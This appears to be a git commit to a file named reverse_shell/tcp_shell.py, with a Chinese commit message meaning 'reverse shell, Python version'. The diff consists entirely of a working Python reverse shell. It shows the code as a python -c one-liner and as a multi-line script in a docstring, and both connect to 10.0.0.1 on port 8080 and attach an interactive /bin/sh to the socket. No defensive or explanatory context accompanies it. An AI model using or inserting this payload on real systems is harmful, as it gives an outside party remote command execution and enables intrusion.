6094f62a33fcb4c96857ff86e6a007f01277a6d0
Lingerhk <lingerhk@gmail.com>
2017-01-21 15:02:04 -0500

    反弹shell py版

--- reverse_shell/tcp_shell.py
+++ reverse_shell/tcp_shell.py
@@ -4,4 +4,20 @@
 # author: s0nnet
 # time: 2017-01-20
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+"""
+# 基于subprocess
+import os
+import socket
+import subprocess
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.0.1",8080))
+
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+
+p=subprocess.call(["/bin/sh","-i"])
+"""
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
